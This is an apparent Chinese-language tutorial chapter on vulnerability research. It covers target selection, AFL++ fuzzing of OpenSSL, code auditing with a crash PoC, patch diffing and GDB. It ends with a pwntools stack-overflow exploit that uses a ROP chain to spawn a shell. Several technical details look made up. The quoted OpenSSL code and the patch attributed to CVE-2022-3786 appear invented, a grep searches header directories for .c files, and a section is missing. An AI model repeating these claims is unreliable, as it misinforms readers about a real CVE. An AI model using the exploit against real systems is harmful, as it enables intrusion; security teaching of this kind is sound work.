## 17.1 选择挖掘目标

### 17.1.1 目标类型

| 类型 | 优点 | 缺点 | 推荐指数 |
|------|------|------|----------|
| **开源软件** | 代码可审计、社区活跃 | 竞争激烈 | ⭐⭐⭐⭐ |
| **闭源软件** | 竞争少、漏洞多 | 需要逆向、法律风险 | ⭐⭐⭐ |
| **Web 应用** | 易测试、影响大 | 需要授权 | ⭐⭐⭐⭐ |
| **内核/驱动** | 高价值、影响大 | 难度大、易崩溃 | ⭐⭐⭐⭐⭐ |
| **嵌入式设备** | 竞争少、防护弱 | 需要硬件、固件提取 | ⭐⭐⭐ |

### 17.1.2 选择标准

**1. 流行度**
- ✅ 用户量大（如 Linux 内核、Apache、Nginx）
- ✅ 企业使用（如 Windows、macOS、iOS）
- ❌ 小众软件（CVE 价值低）

**2. 代码复杂度**
- ✅ 代码量大（> 10 万行）
- ✅ 历史漏洞多（说明代码质量差）
- ❌ 代码量小（< 1 万行，漏洞少）

**3. 维护活跃度**
- ✅ 定期更新（说明在使用）
- ✅ 快速响应（说明重视安全）
- ❌ 长期未更新（可能是废弃项目）

**4. 个人兴趣**
- ✅ 你熟悉的技术栈（如 C/C++、Python、Java）
- ✅ 你感兴趣领域（如 Web 安全、内核安全、IoT 安全）

## 17.3 漏洞挖掘技术

### 17.3.1 Fuzzing（模糊测试）

**适用场景**：
- 文件格式解析（如图片、视频、PDF）
- 网络协议解析（如 HTTP、TLS）
- API 调用（如加密函数）

**示例：使用 AFL++ Fuzz OpenSSL**

**步骤1：准备初始测试用例**
```bash
# 创建输入目录
mkdir -p ~/fuzzing/openssl/input

# 复制真实证书文件作为种子
cp /opt/openssl/certs/*.pem ~/fuzzing/openssl/input/
```

**步骤2：编译目标（AFL 插桩）**
```bash
# 清理之前的编译
make clean

# 使用 AFL 编译器重新编译
CC=afl-gcc ./config -d --prefix=/opt/openssl-asan debug-asan no-shared
make -j8
```

**步骤3：运行 AFL++**
```bash
# 运行 AFL++（4 个并行实例）
cd ~/fuzzing/openssl
afl-fuzz -i input -o output -M master -- /opt/openssl-asan/bin/openssl x509 -in @@ -text
afl-fuzz -i input -o output -S slave1 -- /opt/openssl-asan/bin/openssl x509 -in @@ -text
afl-fuzz -i input -o output -S slave2 -- /opt/openssl-asan/bin/openssl x509 -in @@ -text
afl-fuzz -i input -o output -S slave3 -- /opt/openssl-asan/bin/openssl x509 -in @@ -text
```

**步骤4：监控进度**
```bash
# 查看 AFL++ 状态
watch -n 1 "cat ~/fuzzing/openssl/output/default/fuzzer_stats"

# 关键指标：
#   - cycles_done：完成周期数（越多越好）
#   - execs_done：执行次数（越多越好）
#   - unique_crashes：唯一崩溃数（目标！）
```

**步骤5：分析崩溃**
```bash
# 查看崩溃文件
ls ~/fuzzing/openssl/output/default/crashes/

# 使用 GDB 调试崩溃
gdb --args /opt/openssl-asan/bin/openssl x509 -in ~/fuzzing/openssl/output/default/crashes/id:000001,sig:11,src:001234,time:567890,execs:123456,op:splice,rep:16 -text
```

### 17.3.2 代码审计（白盒测试）

**适用场景**：
- 开源软件（有源代码）
- 小型项目（< 10 万行）
- 历史漏洞多的模块

**示例：审计 OpenSSL X509 解析代码**

**步骤1：定位关键函数**
```bash
# 搜索 X509 相关函数
grep -r "X509" /opt/openssl-asan/include/ --include="*.h"

# 找到关键函数：X509_parse_from_buffer()
```

**步骤2：阅读代码（查找危险函数）**
```c
// openssl/crypto/x509/x509_vfy.c

int X509_verify_cert(X509_STORE_CTX *ctx) {
    STACK_OF(X509) *chain = ctx->chain;
    X509 *x = NULL;
    
    // 危险：没有检查 chain 是否为 NULL
    x = sk_X509_value(chain, 0);  // 可能空指针解引用！
    
    // ...
}
```

**步骤3：编写 PoC**
```c
// poc.c
#include <openssl/x509.h>
#include <openssl/x509v3.h>

int main() {
    X509_STORE_CTX *ctx = X509_STORE_CTX_new();
    
    // 不设置 chain（故意留空）
    // ctx->chain = NULL;
    
    // 触发漏洞
    X509_verify_cert(ctx);
    
    return 0;
}
```

**步骤4：编译并测试**
```bash
gcc -o poc poc.c -I/opt/openssl-asan/include -L/opt/openssl-asan/lib -lssl -lcrypto

# 运行（应该崩溃）
./poc
# Segmentation fault (core dumped)
```

### 17.3.3 补丁分析（Diffing）

**适用场景**：
- 已知漏洞修复（CVE）
- 想要挖掘类似漏洞

**示例：分析 CVE-2022-3786 补丁**

**步骤1：获取补丁**
```bash
# 克隆 OpenSSL 仓库
git clone https://github.com/openssl/openssl.git
cd openssl

# 查找 CVE-2022-3786 相关提交
git log --all --grep="CVE-2022-3786"

# 查看补丁差异
git show <commit-hash>
```

**步骤2：分析补丁**
```diff
--- a/crypto/x509/x509_vfy.c
+++ b/crypto/x509/x509_vfy.c
@@ -123,6 +123,9 @@ int X509_verify_cert(X509_STORE_CTX *ctx) {
     STACK_OF(X509) *chain = ctx->chain;
     X509 *x = NULL;
     
+    if (chain == NULL) {
+        return -1;  // 修复：检查 chain 是否为 NULL
+    }
+    
     x = sk_X509_value(chain, 0);
     // ...
 }
```

**步骤3：挖掘类似漏洞**
```bash
# 搜索代码中所有 sk_X509_value() 调用
grep -r "sk_X509_value" /opt/openssl-asan/include/ --include="*.c"

# 逐个检查是否检查了 NULL
# 如果发现类似问题 → 新的 CVE！
```

## 17.4 验证漏洞可利用性

### 17.4.1 确定漏洞类型

| 类型 | 可利用性 | 验证方法 |
|------|----------|----------|
| **空指针解引用** | 低（通常只是 DoS） | 运行 PoC，观察是否崩溃 |
| **缓冲区溢出** | 高（可能 RCE） | 使用 GDB 查看是否控制 EIP/RIP |
| **UAF** | 高（可能 RCE） | 使用 GDB 查看是否可控制数据 |
| **整数溢出** | 中（可能导致缓冲区溢出） | 构造特定输入，触发后续漏洞 |
| **逻辑漏洞** | 高（可能绕过认证） | 编写完整利用脚本 |

### 17.4.2 使用 GDB 调试

**示例：调试缓冲区溢出**

```bash
# 运行 PoC
gdb --args ./vuln_program poc_input

# 设置断点
(gdb) b vulnerable_function
(gdb) run

# 单步执行
(gdb) ni
(gdb) si

# 查看寄存器
(gdb) info registers rip
rip            0x4141414141414141   0x4141414141414141

# ✅ 确认：控制了 RIP（可能 RCE）
```

### 17.4.3 编写利用脚本

**示例：利用栈溢出**

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './vuln_program'
context.terminal = ['gnome-terminal', '-e']

# 步骤1：泄露 libc 地址
p = process('./vuln_program')
p.sendline(b'%7$s' + b'A' * 100)
puts_addr = u64(p.recv(8))
log.info(f'puts() address: {hex(puts_addr)}')

# 步骤2：计算 libc 基地址
libc_base = puts_addr - 0x84470
log.info(f'libc base: {hex(libc_base)}')

# 步骤3：构造 ROP 链
pop_rdi = 0x4012b3
system_addr = libc_base + 0x4f4e0
binsh_addr = libc_base + 0x1b40fa

payload = b'A' * 112
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# 步骤4：发送 payload
p.sendline(payload)
p.interactive()  # 获取 shell
```
